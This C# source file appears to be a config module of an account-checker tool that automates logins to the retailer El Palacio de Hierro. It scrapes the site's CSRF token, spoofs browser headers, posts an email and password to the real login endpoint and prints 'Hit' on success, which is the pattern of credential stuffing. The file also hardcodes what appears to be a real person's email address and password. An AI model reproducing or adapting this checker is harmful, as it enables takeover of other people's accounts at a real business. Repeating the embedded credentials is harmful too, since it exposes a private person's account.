using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class PalacioHierroMx
    {
        public static void palacio()
        {
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                string email = "zambrano_karina@hotmail.com";
                string pass = "Kzambrano1$";
                req.IgnoreProtocolErrors = true;

                string send_data = req.Get("https://www.elpalaciodehierro.com/login", null).ToString();
                var token = Fox.Fuctions.Parsing.LR(send_data, "name=\"csrf_token\" value=\"", "\" />");
                string tokenp = String.Join(", ", token);
                Console.WriteLine(tokenp);
                req.AddHeader("Host", "www.elpalaciodehierro.com");
                req.AddHeader("Connection", "keep-alive");
                req.AddHeader("sec-ch-ua", "max-age=0");
                req.AddHeader("sec-ch-ua", "Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"");
                req.AddHeader("X-Requested-With", "XMLHttpRequest");
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36";
                req.AddHeader("Accept", "*/*");
                req.AddHeader("Origin", "https://www.elpalaciodehierro.com");
                req.AddHeader("Sec-Fetch-Site", "same-origin");
                req.AddHeader("Sec-Fetch-Mode", "cors");
                req.AddHeader("Sec-Fetch-Dest", "empty");
                req.Referer = "https://www.elpalaciodehierro.com/logi";
                req.AddHeader("Accept-Language", "es-419,es;q=0.9");
                req.AddHeader("Accept-Encoding", "gzip, deflate");
                string payload = "loginEmail=" + email + "&loginPassword=" + pass +"&csrf_token=" + tokenp;
                send_data = req.Post("https://www.elpalaciodehierro.com/on/demandware.store/Sites-palacio-MX-Site/es_MX/Account-Login?rurl=1&ajax=true", payload, "application/x-www-form-urlencoded").ToString();
                if (send_data.Contains("\"success\": true"))
                {
                    Console.WriteLine("Hit");

                }
                else if (send_data.Contains("Nombre de usuario o contraseÃ±a invÃ¡lidos. Por favor intenta de nuevo") | send_data.Contains("Â¡Ups! Esto no coincide con nuestros registros. Por favor revisa la ortografÃ­a e intÃ©ntalo de nuevo."))
                {
                   

                }
               

    
            }
            
        }
    }
}
